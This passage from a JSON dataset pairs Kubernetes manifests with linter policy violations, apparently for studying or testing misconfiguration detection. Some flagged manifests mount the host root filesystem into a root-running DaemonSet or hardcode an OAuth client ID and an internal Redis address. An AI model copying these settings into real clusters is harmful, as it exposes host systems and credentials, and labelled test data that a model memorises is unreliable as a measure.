    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: k8s-local-pv-provisioner\n  namespace: kube-system\n  labels:\n    k8s-app: k8s-local-pv-provisioner\n    name: k8s-local-pv-provisioner\nspec:\n  selector:\n    matchLabels:\n      name: k8s-local-pv-provisioner\n  template:\n    metadata:\n      labels:\n        k8s-app: k8s-local-pv-provisioner\n        name: k8s-local-pv-provisioner\n    spec:\n      serviceAccountName: k8s-local-pv-provisioner\n      containers:\n      - image: meyskens/kubernetes-local-pv-provisioner\n        imagePullPolicy: Always\n        name: k8s-local-pv-provisioner\n        volumeMounts:\n        - mountPath: /rootfs\n          name: rootfs\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n          type: Directory\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"k8s-local-pv-provisioner\" is using an invalid container image, \"meyskens/kubernetes-local-pv-provisioner\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7658",
    "manifest_path": "data/manifests/the_stack_sample/sample_2805.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: k8s-local-pv-provisioner\n  namespace: kube-system\n  labels:\n    k8s-app: k8s-local-pv-provisioner\n    name: k8s-local-pv-provisioner\nspec:\n  selector:\n    matchLabels:\n      name: k8s-local-pv-provisioner\n  template:\n    metadata:\n      labels:\n        k8s-app: k8s-local-pv-provisioner\n        name: k8s-local-pv-provisioner\n    spec:\n      serviceAccountName: k8s-local-pv-provisioner\n      containers:\n      - image: meyskens/kubernetes-local-pv-provisioner\n        imagePullPolicy: Always\n        name: k8s-local-pv-provisioner\n        volumeMounts:\n        - mountPath: /rootfs\n          name: rootfs\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"k8s-local-pv-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "7659",
    "manifest_path": "data/manifests/the_stack_sample/sample_2805.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: k8s-local-pv-provisioner\n  namespace: kube-system\n  labels:\n    k8s-app: k8s-local-pv-provisioner\n    name: k8s-local-pv-provisioner\nspec:\n  selector:\n    matchLabels:\n      name: k8s-local-pv-provisioner\n  template:\n    metadata:\n      labels:\n        k8s-app: k8s-local-pv-provisioner\n        name: k8s-local-pv-provisioner\n    spec:\n      serviceAccountName: k8s-local-pv-provisioner\n      containers:\n      - image: meyskens/kubernetes-local-pv-provisioner\n        imagePullPolicy: Always\n        name: k8s-local-pv-provisioner\n        volumeMounts:\n        - mountPath: /rootfs\n          name: rootfs\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n          type: Directory\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"k8s-local-pv-provisioner\" not found"
  },
  {
    "id": "7660",
    "manifest_path": "data/manifests/the_stack_sample/sample_2805.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: k8s-local-pv-provisioner\n  namespace: kube-system\n  labels:\n    k8s-app: k8s-local-pv-provisioner\n    name: k8s-local-pv-provisioner\nspec:\n  selector:\n    matchLabels:\n      name: k8s-local-pv-provisioner\n  template:\n    metadata:\n      labels:\n        k8s-app: k8s-local-pv-provisioner\n        name: k8s-local-pv-provisioner\n    spec:\n      serviceAccountName: k8s-local-pv-provisioner\n      containers:\n      - image: meyskens/kubernetes-local-pv-provisioner\n        imagePullPolicy: Always\n        name: k8s-local-pv-provisioner\n        volumeMounts:\n        - mountPath: /rootfs\n          name: rootfs\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"k8s-local-pv-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "7661",
    "manifest_path": "data/manifests/the_stack_sample/sample_2805.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: k8s-local-pv-provisioner\n  namespace: kube-system\n  labels:\n    k8s-app: k8s-local-pv-provisioner\n    name: k8s-local-pv-provisioner\nspec:\n  selector:\n    matchLabels:\n      name: k8s-local-pv-provisioner\n  template:\n    metadata:\n      labels:\n        k8s-app: k8s-local-pv-provisioner\n        name: k8s-local-pv-provisioner\n    spec:\n      serviceAccountName: k8s-local-pv-provisioner\n      containers:\n      - image: meyskens/kubernetes-local-pv-provisioner\n        imagePullPolicy: Always\n        name: k8s-local-pv-provisioner\n        volumeMounts:\n        - mountPath: /rootfs\n          name: rootfs\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n          type: Directory\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/\" is mounted on container \"k8s-local-pv-provisioner\""
  },
  {
    "id": "7662",
    "manifest_path": "data/manifests/the_stack_sample/sample_2805.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: k8s-local-pv-provisioner\n  namespace: kube-system\n  labels:\n    k8s-app: k8s-local-pv-provisioner\n    name: k8s-local-pv-provisioner\nspec:\n  selector:\n    matchLabels:\n      name: k8s-local-pv-provisioner\n  template:\n    metadata:\n      labels:\n        k8s-app: k8s-local-pv-provisioner\n        name: k8s-local-pv-provisioner\n    spec:\n      serviceAccountName: k8s-local-pv-provisioner\n      containers:\n      - image: meyskens/kubernetes-local-pv-provisioner\n        imagePullPolicy: Always\n        name: k8s-local-pv-provisioner\n        volumeMounts:\n        - mountPath: /rootfs\n          name: rootfs\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"k8s-local-pv-provisioner\" has cpu request 0"
  },
  {
    "id": "7663",
    "manifest_path": "data/manifests/the_stack_sample/sample_2805.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: k8s-local-pv-provisioner\n  namespace: kube-system\n  labels:\n    k8s-app: k8s-local-pv-provisioner\n    name: k8s-local-pv-provisioner\nspec:\n  selector:\n    matchLabels:\n      name: k8s-local-pv-provisioner\n  template:\n    metadata:\n      labels:\n        k8s-app: k8s-local-pv-provisioner\n        name: k8s-local-pv-provisioner\n    spec:\n      serviceAccountName: k8s-local-pv-provisioner\n      containers:\n      - image: meyskens/kubernetes-local-pv-provisioner\n        imagePullPolicy: Always\n        name: k8s-local-pv-provisioner\n        volumeMounts:\n        - mountPath: /rootfs\n          name: rootfs\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"k8s-local-pv-provisioner\" has memory limit 0"
  },
  {
    "id": "7664",
    "manifest_path": "data/manifests/the_stack_sample/sample_2812.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4626\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7665",
    "manifest_path": "data/manifests/the_stack_sample/sample_2812.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4626\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7666",
    "manifest_path": "data/manifests/the_stack_sample/sample_2812.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4626\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7667",
    "manifest_path": "data/manifests/the_stack_sample/sample_2812.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4626\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7668",
    "manifest_path": "data/manifests/the_stack_sample/sample_2812.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4626\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7669",
    "manifest_path": "data/manifests/the_stack_sample/sample_2814.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: amppackager-nfs-server\nspec:\n  ports:\n  - name: nfs\n    port: 2049\n  - name: mountd\n    port: 20048\n  - name: rpcbind\n    port: 111\n  selector:\n    role: nfs-server\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[role:nfs-server])"
  },
  {
    "id": "7670",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"count\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7671",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"count\" does not have a read-only root file system"
  },
  {
    "id": "7672",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"count-agent\" does not have a read-only root file system"
  },
  {
    "id": "7673",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"count\" is not set to runAsNonRoot"
  },
  {
    "id": "7674",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"count-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "7675",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"count\" has cpu request 0"
  },
  {
    "id": "7676",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"count-agent\" has cpu request 0"
  },
  {
    "id": "7677",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"count\" has memory limit 0"
  },
  {
    "id": "7678",
    "manifest_path": "data/manifests/the_stack_sample/sample_2816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: counter\nspec:\n  containers:\n  - name: count\n    image: busybox\n    args:\n    - /bin/sh\n    - -c\n    - \"i=0; while true; do\\n  echo \\\"$i: $(date)\\\" >> /var/log/1.log;\\n  echo \\\"$(date)\\\n      \\ INFO $i\\\" >> /var/log/2.log;\\n  i=$((i+1));\\n  sleep 1;\\ndone\\n\"\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n  - name: count-agent\n    image: k8s.gcr.io/fluentd-gcp:1.30\n    env:\n    - name: FLUENTD_ARGS\n      value: -c /etc/fluentd-config/fluentd.conf\n    volumeMounts:\n    - name: varlog\n      mountPath: /var/log\n    - name: config-volume\n      mountPath: /etc/fluentd-config\n  volumes:\n  - name: varlog\n    emptyDir: {}\n  - name: config-volume\n    configMap:\n      name: fluentd-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"count-agent\" has memory limit 0"
  },
  {
    "id": "7679",
    "manifest_path": "data/manifests/the_stack_sample/sample_2817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2199\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7680",
    "manifest_path": "data/manifests/the_stack_sample/sample_2817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2199\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7681",
    "manifest_path": "data/manifests/the_stack_sample/sample_2817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2199\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7682",
    "manifest_path": "data/manifests/the_stack_sample/sample_2817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2199\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7683",
    "manifest_path": "data/manifests/the_stack_sample/sample_2817.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2199\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7684",
    "manifest_path": "data/manifests/the_stack_sample/sample_2820.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: $APP\n  labels:\n    app: $APP\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: $APP\n  template:\n    metadata:\n      labels:\n        app: $APP\n    spec:\n      containers:\n      - name: $APP\n        image: $IMAGE\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n          limits:\n            cpu: 300m\n            memory: 400Mi\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        env:\n        - name: CACHE_REFRESH_INTERVAL\n          value: '3600'\n        - name: REDIS_URL\n          value: rediss://10.37.248.211:6378\n        - name: SF_OAUTH_PROVIDER_CLIENT_ID\n          value: 3MVG9TSaZ8P6zP1roce2837A2tPdW0m11CDTD2ftXt4UOVzip.GoHEMhsA8V6ILC3Fmv0U6KCYSPecLfH.gQX\n        - name: OAUTH_IDENTIFIER\n          value: SALESFORCE\n        - name: SF_OAUTH_PROVIDER_REDIRECT_URI\n          value: https://$DOMAIN/oauth2/callback\n        - name: SF_OAUTH_PROVIDER_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: $APP\n              key: sfOauthProviderClientSecret\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"$APP\" is using an invalid container image, \"$IMAGE\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7685",
    "manifest_path": "data/manifests/the_stack_sample/sample_2820.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: $APP\n  labels:\n    app: $APP\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: $APP\n  template:\n    metadata:\n      labels:\n        app: $APP\n    spec:\n      containers:\n      - name: $APP\n        image: $IMAGE\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n          limits:\n            cpu: 300m\n            memory: 400Mi\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        env:\n        - name: CACHE_REFRESH_INTERVAL\n          value: '3600'\n        - name: REDIS_URL\n          value: rediss://10.37.248.211:6378\n        - name: SF_OAUTH_PROVIDER_CLIENT_ID\n          value: 3MVG9TSaZ8P6zP1roce2837A2tPdW0m11CDTD2ftXt4UOVzip.GoHEMhsA8V6ILC3Fmv0U6KCYSPecLfH.gQX\n        - name: OAUTH_IDENTIFIER\n          value: SALESFORCE\n        - name: SF_OAUTH_PROVIDER_REDIRECT_URI\n          value: https://$DOMAIN/oauth2/callback\n        - name: SF_OAUTH_PROVIDER_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: $APP\n              key: sfOauthProviderClientSecret\n",
    "policy_id": "mismatching-selector",
    "violation_text": "object has invalid label selector: values[0][app]: Invalid value: \"$APP\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "7686",
    "manifest_path": "data/manifests/the_stack_sample/sample_2820.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: $APP\n  labels:\n    app: $APP\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: $APP\n  template:\n    metadata:\n      labels:\n        app: $APP\n    spec:\n      containers:\n      - name: $APP\n        image: $IMAGE\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n          limits:\n            cpu: 300m\n            memory: 400Mi\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        env:\n        - name: CACHE_REFRESH_INTERVAL\n          value: '3600'\n        - name: REDIS_URL\n          value: rediss://10.37.248.211:6378\n        - name: SF_OAUTH_PROVIDER_CLIENT_ID\n          value: 3MVG9TSaZ8P6zP1roce2837A2tPdW0m11CDTD2ftXt4UOVzip.GoHEMhsA8V6ILC3Fmv0U6KCYSPecLfH.gQX\n        - name: OAUTH_IDENTIFIER\n          value: SALESFORCE\n        - name: SF_OAUTH_PROVIDER_REDIRECT_URI\n          value: https://$DOMAIN/oauth2/callback\n        - name: SF_OAUTH_PROVIDER_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: $APP\n              key: sfOauthProviderClientSecret\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7687",
    "manifest_path": "data/manifests/the_stack_sample/sample_2820.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: $APP\n  labels:\n    app: $APP\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: $APP\n  template:\n    metadata:\n      labels:\n        app: $APP\n    spec:\n      containers:\n      - name: $APP\n        image: $IMAGE\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n          limits:\n            cpu: 300m\n            memory: 400Mi\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        env:\n        - name: CACHE_REFRESH_INTERVAL\n          value: '3600'\n        - name: REDIS_URL\n          value: rediss://10.37.248.211:6378\n        - name: SF_OAUTH_PROVIDER_CLIENT_ID\n          value: 3MVG9TSaZ8P6zP1roce2837A2tPdW0m11CDTD2ftXt4UOVzip.GoHEMhsA8V6ILC3Fmv0U6KCYSPecLfH.gQX\n        - name: OAUTH_IDENTIFIER\n          value: SALESFORCE\n        - name: SF_OAUTH_PROVIDER_REDIRECT_URI\n          value: https://$DOMAIN/oauth2/callback\n        - name: SF_OAUTH_PROVIDER_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: $APP\n              key: sfOauthProviderClientSecret\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"$APP\" does not have a read-only root file system"
  },
  {
    "id": "7688",
    "manifest_path": "data/manifests/the_stack_sample/sample_2820.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: $APP\n  labels:\n    app: $APP\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: $APP\n  template:\n    metadata:\n      labels:\n        app: $APP\n    spec:\n      containers:\n      - name: $APP\n        image: $IMAGE\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n          limits:\n            cpu: 300m\n            memory: 400Mi\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        readinessProbe:\n          initialDelaySeconds: 30\n          httpGet:\n            path: /health\n            port: 8080\n        env:\n        - name: CACHE_REFRESH_INTERVAL\n          value: '3600'\n        - name: REDIS_URL\n          value: rediss://10.37.248.211:6378\n        - name: SF_OAUTH_PROVIDER_CLIENT_ID\n          value: 3MVG9TSaZ8P6zP1roce2837A2tPdW0m11CDTD2ftXt4UOVzip.GoHEMhsA8V6ILC3Fmv0U6KCYSPecLfH.gQX\n        - name: OAUTH_IDENTIFIER\n          value: SALESFORCE\n        - name: SF_OAUTH_PROVIDER_REDIRECT_URI\n          value: https://$DOMAIN/oauth2/callback\n        - name: SF_OAUTH_PROVIDER_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: $APP\n              key: sfOauthProviderClientSecret\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"$APP\" is not set to runAsNonRoot"
  },
  {
    "id": "7689",
